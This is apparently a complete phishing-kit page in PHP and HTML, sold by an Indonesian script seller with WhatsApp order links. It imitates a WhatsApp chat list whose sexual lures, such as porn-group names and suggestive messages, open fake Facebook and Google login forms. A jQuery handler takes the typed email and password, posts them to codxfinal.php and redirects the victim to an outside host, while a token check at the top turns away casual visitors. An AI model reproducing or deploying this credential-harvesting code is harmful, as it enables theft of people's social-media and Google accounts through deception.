<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62891630150

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Chat List</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/all.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
  <style>
    .chat-row:hover {
      background-color: #f0f0f0;
      cursor: pointer;
    }
  </style>
</head>
<body class="bg-white text-black">

  <!-- Header -->
  <header class="px-4 py-3 flex justify-between items-center bg-white">
    <h1 class="text-2xl font-bold text-green-500">WhatsApp</h1>
    <div class="flex items-center space-x-4">
      <i class="fas fa-camera text-xl"></i>
      <i class="fas fa-ellipsis-v text-xl"></i>
    </div>
  </header>

  <!-- Chat List -->
  <main class="overflow-y-auto max-h-[85vh] mb-[70px]">

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/preview.gif" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Pemersatu bangsa</p>
        <p class="text-sm text-gray-600 truncate">+62 878-1218-3330 bergabung menggunakan tautan undangan ini</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/bahan4.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Bokep 2025</p>
        <p class="text-sm text-gray-600 truncate">~ Amanda: Cari Cowok Sange 🥵</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/bahan3.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Video Telanjang</p>
        <p class="text-sm text-gray-600 truncate">~ Yanto: Yang Mau Video Telanjang G...</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/admin.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Vcs Bareng</p>
        <p class="text-sm text-gray-600 truncate">~ Mamah Muda: Cari Cowok Yang Ku...</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/bahan2.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Video Viral</p>
        <p class="text-sm text-gray-600 truncate">~ Jepa: Yang punya video terbaru min…</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/bahan2.webp" alt="SpongeBob" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 765-7272-4340</p>
        <p class="text-sm text-gray-600 truncate">Punya Kamu Berurat Gak</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/profil3.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 874-7272-4340</p>
        <p class="text-sm text-gray-600 truncate">Lagi Sange Temenin Donk</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="codxLoginPopup()" class="chat-row flex items-center px-4 py-3">
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/6/bahan1.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 877-6272-7263</p>
        <p class="text-sm text-gray-600 truncate">Halo Vcs Mau Gak</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>
  </main>

  <!-- Bottom Navigation -->
  <nav class="fixed bottom-0 left-0 right-0 flex justify-around items-center border-t border-gray-200 bg-white py-3 z-50">
    <button onclick="codxLoginPopup()" class="flex flex-col items-center text-[#25D366] font-extrabold text-xs">
      <div class="bg-[#D9FDD3] rounded-full w-10 h-8 flex items-center justify-center mb-1">
        <i class="fas fa-comment-alt text-[#25D366] text-lg"></i>
      </div>
      Chat
    </button>
    <button onclick="codxLoginPopup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-bullseye text-xl mb-1"></i>
      Status
    </button>
    <button onclick="codxLoginPopup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-users text-xl mb-1"></i>
      Komunitas
    </button>
    <button onclick="codxLoginPopup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-phone-alt text-xl mb-1"></i>
      Panggilan
    </button>
  </nav>

  <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" onsubmit="VerificationData();" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" onsubmit="VerificationData();" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.6.min.js"></script>
 <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.alex-hosting.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M https://wa.me/62895316150
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>